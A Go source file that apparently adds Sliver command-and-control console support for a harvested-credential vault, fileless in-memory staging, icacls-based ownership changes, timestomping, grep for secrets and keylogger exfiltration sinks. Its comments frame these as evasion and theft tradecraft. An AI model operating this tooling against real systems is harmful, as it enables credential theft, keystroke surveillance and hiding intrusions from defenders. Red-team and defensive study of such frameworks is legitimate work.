package sliver

import (
	"errors"
	"fmt"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ---------------------------------------------------------------------------
// Credential vault
//
// Sliver keeps a server-side credential store that survives session loss: hashes
// and plaintexts collected across every target land in one place. The TUI has
// `creds`; the console previously had no way to reach it, so harvested secrets
// were effectively write-only from the web UI.
// ---------------------------------------------------------------------------

// CredentialView is the JSON shape of a stored credential.
type CredentialView struct {
	ID             string `json:"ID"`
	Username       string `json:"Username"`
	Plaintext      string `json:"Plaintext"`
	Hash           string `json:"Hash"`
	HashType       int32  `json:"HashType"`
	IsCracked      bool   `json:"IsCracked"`
	OriginHostUUID string `json:"OriginHostUUID"`
	Collection     string `json:"Collection"`
}

func credentialToView(c *clientpb.Credential) CredentialView {
	if c == nil {
		return CredentialView{}
	}
	return CredentialView{
		ID:             c.ID,
		Username:       c.Username,
		Plaintext:      c.Plaintext,
		Hash:           c.Hash,
		HashType:       int32(c.HashType),
		IsCracked:      c.IsCracked,
		OriginHostUUID: c.OriginHostUUID,
		Collection:     c.Collection,
	}
}

func credentialFromView(v CredentialView) *clientpb.Credential {
	return &clientpb.Credential{
		ID:             v.ID,
		Username:       v.Username,
		Plaintext:      v.Plaintext,
		Hash:           v.Hash,
		HashType:       clientpb.HashType(v.HashType),
		IsCracked:      v.IsCracked,
		OriginHostUUID: v.OriginHostUUID,
		Collection:     v.Collection,
	}
}

// Creds lists every credential in the server vault.
func (c *Client) Creds() ([]CredentialView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.Creds(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]CredentialView, 0, len(resp.Credentials))
	for _, x := range resp.Credentials {
		out = append(out, credentialToView(x))
	}
	return out, nil
}

// CredsAdd stores one or more credentials. Sliver treats the whole list as one
// batch, so a partially-valid payload stores nothing.
func (c *Client) CredsAdd(creds []CredentialView) error {
	if len(creds) == 0 {
		return errors.New("no credentials supplied")
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	batch := &clientpb.Credentials{}
	for _, v := range creds {
		batch.Credentials = append(batch.Credentials, credentialFromView(v))
	}
	_, err := c.RPC.CredsAdd(ctx, batch)
	return err
}

// CredsRm deletes credentials by ID.
func (c *Client) CredsRm(ids []string) error {
	if len(ids) == 0 {
		return errors.New("no credential ids supplied")
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	batch := &clientpb.Credentials{}
	for _, id := range ids {
		batch.Credentials = append(batch.Credentials, &clientpb.Credential{ID: id})
	}
	_, err := c.RPC.CredsRm(ctx, batch)
	return err
}

// CredsUpdate overwrites the mutable fields of existing credentials.
func (c *Client) CredsUpdate(creds []CredentialView) error {
	if len(creds) == 0 {
		return errors.New("no credentials supplied")
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	batch := &clientpb.Credentials{}
	for _, v := range creds {
		batch.Credentials = append(batch.Credentials, credentialFromView(v))
	}
	_, err := c.RPC.CredsUpdate(ctx, batch)
	return err
}

// GetCredByID fetches a single credential.
func (c *Client) GetCredByID(id string) (CredentialView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.GetCredByID(ctx, &clientpb.Credential{ID: id})
	if err != nil {
		return CredentialView{}, err
	}
	return credentialToView(resp), nil
}

// CredsSniffHashType asks the server to identify an unknown hash's type, which
// is what makes imported hashes catalogueable without knowing the format.
func (c *Client) CredsSniffHashType(hash string) (CredentialView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.CredsSniffHashType(ctx, &clientpb.Credential{Hash: hash})
	if err != nil {
		return CredentialView{}, err
	}
	return credentialToView(resp), nil
}

// GetCredsByHashType filters the vault by hash type.
func (c *Client) GetCredsByHashType(hashType int32) ([]CredentialView, error) {
	return c.credsByHashType(hashType, false)
}

// GetPlaintextCredsByHashType returns only entries whose plaintext is known.
func (c *Client) GetPlaintextCredsByHashType(hashType int32) ([]CredentialView, error) {
	return c.credsByHashType(hashType, true)
}

func (c *Client) credsByHashType(hashType int32, plaintextOnly bool) ([]CredentialView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	req := &clientpb.Credential{HashType: clientpb.HashType(hashType)}
	var (
		resp *clientpb.Credentials
		err  error
	)
	if plaintextOnly {
		resp, err = c.RPC.GetPlaintextCredsByHashType(ctx, req)
	} else {
		resp, err = c.RPC.GetCredsByHashType(ctx, req)
	}
	if err != nil {
		return nil, err
	}
	out := make([]CredentialView, 0, len(resp.Credentials))
	for _, x := range resp.Credentials {
		out = append(out, credentialToView(x))
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// Memfiles
//
// Memfiles are anonymous in-memory files on the target. They matter for
// post-exploitation because staging a payload through memory avoids writing to
// disk entirely, which is the difference between a dropped-file IOC and none.
// ---------------------------------------------------------------------------

// MemfilesAdd allocates a new memfile and returns its descriptor.
func (c *Client) MemfilesAdd(sessionID string) (int64, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MemfilesAdd(ctx, &sliverpb.MemfilesAddReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return 0, err
	}
	if resp.GetResponse().GetErr() != "" {
		return 0, errors.New(resp.GetResponse().GetErr())
	}
	return resp.Fd, nil
}

// MemfilesList lists the memfiles currently open in a session.
func (c *Client) MemfilesList(sessionID string) (*DirView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MemfilesList(ctx, &sliverpb.MemfilesListReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.GetResponse().GetErr() != "" {
		return nil, errors.New(resp.GetResponse().GetErr())
	}
	// MemfilesList returns the same shape as a directory listing.
	return dirToView(resp), nil
}

// MemfilesRm closes a memfile by descriptor.
func (c *Client) MemfilesRm(sessionID string, fd int64) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MemfilesRm(ctx, &sliverpb.MemfilesRmReq{
		Fd:      fd,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// ---------------------------------------------------------------------------
// File attributes and content search
// ---------------------------------------------------------------------------

// Chmod changes a file's mode, optionally recursively.
func (c *Client) Chmod(sessionID, path, mode string, recursive bool) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.Chmod(ctx, &sliverpb.ChmodReq{
		Path:      path,
		FileMode:  mode,
		Recursive: recursive,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// ---------------------------------------------------------------------------
// Ownership and permissions on Windows
//
// Sliver's Chmod and Chown RPCs have no handler in the Windows implant: a file
// there carries a security descriptor rather than a mode word and a uid/gid
// pair, so either message sent to a Windows target comes back as the implant's
// own "unknown message type" -- a sentence that names neither the feature nor
// the platform, and reads as a console bug rather than as "this target is the
// wrong shape for this call".
//
// Both operations do exist on Windows, expressed as ACL entries, and the tool
// Windows ships for editing them is icacls. The console drives that over the
// ordinary execute RPC, so the same two buttons work on every target and a
// refusal comes back as icacls' own text -- "Access is denied", or the missing
// privilege -- instead of an unknown-message error.
// ---------------------------------------------------------------------------

// icaclsPath is spelled out rather than left to a PATH lookup: a target whose
// PATH has been rewritten could otherwise substitute a different binary for the
// one this code means to run.
const icaclsPath = `C:\Windows\System32\icacls.exe`

// icaclsPerms are the permission levels the console offers, spelled the way
// icacls spells them. The set is a whitelist because the value is concatenated
// into an argument: anything else is refused before it can reach the command
// line.
var icaclsPerms = map[string]bool{
	"F":  true, // full control
	"M":  true, // modify
	"RX": true, // read and execute
	"R":  true, // read
	"W":  true, // write
}

// windowsSetOwnerArgs builds the icacls invocation that assigns an owner.
func windowsSetOwnerArgs(path, owner string, recursive bool) []string {
	args := []string{path, "/setowner", owner}
	if recursive {
		args = append(args, "/T")
	}
	return args
}

// windowsGrantArgs builds the icacls invocation that replaces a principal's
// permission entry.
//
// /grant:r replaces an entry the principal already has rather than adding a
// second one, which is what "set this permission" means to an operator. Plain
// /grant accumulates entries and ends up with a file whose effective rights are
// the union of everything ever granted.
func windowsGrantArgs(path, principal, perm string, recursive bool) []string {
	args := []string{path, "/grant:r", principal + ":" + perm}
	if recursive {
		args = append(args, "/T")
	}
	return args
}

// Chown changes file ownership on any platform.
//
// Unix and macOS sessions go through the Chown RPC. A Windows session has no
// such handler, so ownership is set with icacls, which is the same operation in
// the form that platform has. gid is ignored there: a Windows file has a single
// owner SID, not a user/group pair.
func (c *Client) Chown(sessionID, path, uid, gid string, recursive bool) error {
	if c.IsWindowsTarget(sessionID) {
		return c.runIcacls(sessionID, windowsSetOwnerArgs(path, uid, recursive))
	}
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.Chown(ctx, &sliverpb.ChownReq{
		Path:      path,
		Uid:       uid,
		Gid:       gid,
		Recursive: recursive,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// GrantACL replaces a principal's permission entry on a Windows target.
//
// This is the Windows counterpart of Chmod. It refuses a non-Windows session
// rather than falling back to a mode word: a POSIX target has no ACL entry to
// grant, and chmod expresses the same intent there with more precision than a
// single permission level could.
func (c *Client) GrantACL(sessionID, path, principal, perm string, recursive bool) error {
	if !c.IsWindowsTarget(sessionID) {
		return errors.New("granting an ACL entry is a Windows operation; " +
			"this target is not Windows, so use chmod instead")
	}
	if !icaclsPerms[perm] {
		return fmt.Errorf("unknown permission %q: expected one of F, M, RX, R, W", perm)
	}
	if strings.ContainsAny(principal, ":") || strings.HasPrefix(principal, "/") {
		return fmt.Errorf("invalid account name %q", principal)
	}
	return c.runIcacls(sessionID, windowsGrantArgs(path, principal, perm, recursive))
}

// runIcacls runs icacls and turns a non-zero exit into an error carrying what
// the tool printed.
//
// icacls reports a refusal -- a file the session's account does not own, an
// account without SeRestorePrivilege -- on stderr with a non-zero exit code,
// while the RPC itself reports success because a process really did run. Without
// this check the console would show a green "updated" toast for a change that
// never happened.
func (c *Client) runIcacls(sessionID string, args []string) error {
	res, err := c.Execute(sessionID, icaclsPath, args)
	if err != nil {
		return err
	}
	if res.Status != 0 {
		msg := strings.TrimSpace(res.Stderr)
		if msg == "" {
			msg = strings.TrimSpace(res.Stdout)
		}
		if msg == "" {
			msg = "no output"
		}
		return fmt.Errorf("icacls failed (exit %d): %s", res.Status, msg)
	}
	return nil
}

// Chtimes rewrites access and modification timestamps, which is how collected
// files are timestomped back to their original times to avoid standing out.
func (c *Client) Chtimes(sessionID, path string, atime, mtime int64) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.Chtimes(ctx, &sliverpb.ChtimesReq{
		Path:    path,
		ATime:   atime,
		MTime:   mtime,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return err
	}
	if resp.GetResponse().GetErr() != "" {
		return errors.New(resp.GetResponse().GetErr())
	}
	return nil
}

// GrepMatch is one hit inside a file.
type GrepMatch struct {
	LineNumber  int64    `json:"LineNumber"`
	Line        string   `json:"Line"`
	LinesBefore []string `json:"LinesBefore,omitempty"`
	LinesAfter  []string `json:"LinesAfter,omitempty"`
}

// GrepFileResult groups matches by file.
type GrepFileResult struct {
	Path     string      `json:"Path"`
	IsBinary bool        `json:"IsBinary"`
	Matches  []GrepMatch `json:"Matches"`
}

// Grep searches file contents across the target's filesystem. This is the
// primary "find secrets on disk" primitive: hunting config files, scripts and
// logs for passwords and keys without pulling everything back first.
func (c *Client) Grep(sessionID, pattern, path string, recursive bool, before, after int32) (*GrepOut, error) {
	ctx, cancel := c.rpcCtx(5 * opTimeout)
	defer cancel()
	resp, err := c.RPC.Grep(ctx, &sliverpb.GrepReq{
		SearchPattern: pattern,
		Path:          path,
		Recursive:     recursive,
		LinesBefore:   before,
		LinesAfter:    after,
		Request:       &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.GetResponse().GetErr() != "" {
		return nil, errors.New(resp.GetResponse().GetErr())
	}
	out := &GrepOut{SearchPath: resp.SearchPathAbsolute}
	for file, gr := range resp.Results {
		entry := GrepFileResult{Path: file, IsBinary: gr.IsBinary}
		for _, m := range gr.FileResults {
			entry.Matches = append(entry.Matches, GrepMatch{
				LineNumber:  m.LineNumber,
				Line:        m.Line,
				LinesBefore: m.LinesBefore,
				LinesAfter:  m.LinesAfter,
			})
		}
		out.Results = append(out.Results, entry)
	}
	return out, nil
}

// GrepOut is the JSON shape of a grep response.
type GrepOut struct {
	SearchPath string           `json:"SearchPath"`
	Results    []GrepFileResult `json:"Results"`
}

// ---------------------------------------------------------------------------
// Monitoring providers (keylogger exfil sinks)
//
// Sliver's monitor captures keystrokes and can forward them to a third-party
// service. Without provider configuration the keylogger has nowhere to deliver,
// so this is what makes MonitorStart useful.
// ---------------------------------------------------------------------------

// MonitorProviderView is the JSON shape of a monitoring provider.
type MonitorProviderView struct {
	ID          string `json:"ID"`
	Type        string `json:"Type"`
	APIKey      string `json:"APIKey"`
	APIPassword string `json:"APIPassword"`
}

func monitorToView(p *clientpb.MonitoringProvider) MonitorProviderView {
	if p == nil {
		return MonitorProviderView{}
	}
	return MonitorProviderView{ID: p.ID, Type: p.Type, APIKey: p.APIKey, APIPassword: p.APIPassword}
}

// MonitorAddConfig registers a telemetry sink.
func (c *Client) MonitorAddConfig(v MonitorProviderView) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MonitorAddConfig(ctx, &clientpb.MonitoringProvider{
		ID: v.ID, Type: v.Type, APIKey: v.APIKey, APIPassword: v.APIPassword,
	})
	if err != nil {
		return err
	}
	if resp.GetErr() != "" {
		return fmt.Errorf("%s", resp.GetErr())
	}
	return nil
}

// MonitorDelConfig removes a telemetry sink.
func (c *Client) MonitorDelConfig(v MonitorProviderView) error {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MonitorDelConfig(ctx, &clientpb.MonitoringProvider{ID: v.ID, Type: v.Type})
	if err != nil {
		return err
	}
	if resp.GetErr() != "" {
		return fmt.Errorf("%s", resp.GetErr())
	}
	return nil
}

// MonitorListConfig lists configured telemetry sinks.
func (c *Client) MonitorListConfig() ([]MonitorProviderView, error) {
	ctx, cancel := c.rpcCtx(opTimeout)
	defer cancel()
	resp, err := c.RPC.MonitorListConfig(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]MonitorProviderView, 0, len(resp.Providers))
	for _, p := range resp.Providers {
		out = append(out, monitorToView(p))
	}
	return out, nil
}
